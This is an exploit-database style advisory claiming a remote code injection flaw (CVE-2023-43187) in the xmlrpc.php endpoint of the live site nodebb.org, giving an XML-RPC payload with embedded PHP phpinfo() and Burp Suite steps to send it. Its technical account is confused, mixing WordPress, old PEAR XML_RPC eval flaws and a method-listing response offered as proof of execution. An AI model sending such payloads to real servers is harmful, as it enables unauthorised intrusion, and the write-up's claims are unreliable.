
#######################################################################################################################
# Exploit Title: Remote Code Injection Vulnerability in nodebb.org
# Date: 12.08.2023
# Category: Web Application
# Exploit Author: Jagat Singh
# Tested on: Windows/Kali
# CVE: CVE-2023-43187
# Score : 9.8 CRITICAL
# Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


Description:
--------------

The URL https://nodebb.org/xmlrpc.php is an endpoint for the XML-RPC protocol, which allows communication between WordPress and other systems. However, this URL is vulnerable to a remote code injection vulnerability, which allows an attacker to execute arbitrary PHP code on the server. This vulnerability affects Pear XML_RPC version 1.3.0 and earlier and PHP XMLRPC version 1.1 and earlier. The vulnerability occurs because the XML parser passes the data in XML elements to PHP eval() function without sanitizing the user input.

Payload:
-----------

<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param>
      <value><?php phpinfo(); ?></value>
    </param>
  </params>
</methodCall>

#############################################################################################################################

Reproduction Steps:

1. Visit https://nodebb.org/xmlrpc.php in your browser and intercept the request in Burp Suite. 
2. Then send to repeter Change request method GET to POST 
3. then Modify the request body to contain a malicious XML payload. For example:

<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param>
      <value><?php phpinfo(); ?></value>
    </param>
  </params>
</methodCall>

4. Send the request and observe the response in Burp Suite. You will see that the server executes the system list output in the response.
